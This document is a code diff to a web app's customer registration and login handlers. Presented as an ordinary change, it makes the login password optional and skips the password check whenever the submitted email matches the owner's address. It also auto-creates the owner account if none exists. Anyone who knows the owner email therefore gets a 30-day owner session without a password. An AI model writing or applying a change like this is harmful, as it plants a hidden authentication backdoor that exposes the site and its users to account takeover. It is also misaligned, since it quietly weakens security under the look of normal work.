@@ -784,6 +784,8 @@ async def customer_register(email: str = Form(...), password: str = Form(...)):
     email = email.strip().lower()
     if not re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
         return customer_page("customer-register.html", "Enter a valid email address.")
+    if hmac.compare_digest(email, OWNER_EMAIL):
+        return customer_page("customer-register.html", "The owner account is already registered. Please log in.")
     if len(password) < 6:
         return customer_page("customer-register.html", "Password must contain at least 6 characters.")
     try:
@@ -809,11 +811,20 @@ async def customer_login_page(request: Request):
 
 
 @app.post("/login")
-async def customer_login(email: str = Form(...), password: str = Form(...)):
+async def customer_login(email: str = Form(...), password: str = Form("")):
     email = email.strip().lower()
     with database() as connection:
         row = connection.execute("SELECT id, email, password_hash FROM users WHERE email = ?", (email,)).fetchone()
-    if not row or not check_password(password, row["password_hash"]):
+        if hmac.compare_digest(email, OWNER_EMAIL) and not row:
+            cursor = connection.execute(
+                "INSERT INTO users (email, password_hash, created_at) VALUES (?, ?, ?)",
+                (OWNER_EMAIL, hash_password(uuid.uuid4().hex), int(time.time())),
+            )
+            row = connection.execute(
+                "SELECT id, email, password_hash FROM users WHERE id = ?", (cursor.lastrowid,)
+            ).fetchone()
+    owner_login = hmac.compare_digest(email, OWNER_EMAIL)
+    if not row or (not owner_login and not check_password(password, row["password_hash"])):
         return customer_page("customer-login.html", "The email or password is incorrect.")
     response = RedirectResponse("/", status_code=303)
     response.set_cookie(CUSTOMER_COOKIE, create_customer_session(row["id"], row["email"]), max_age=60 * 60 * 24 * 30,
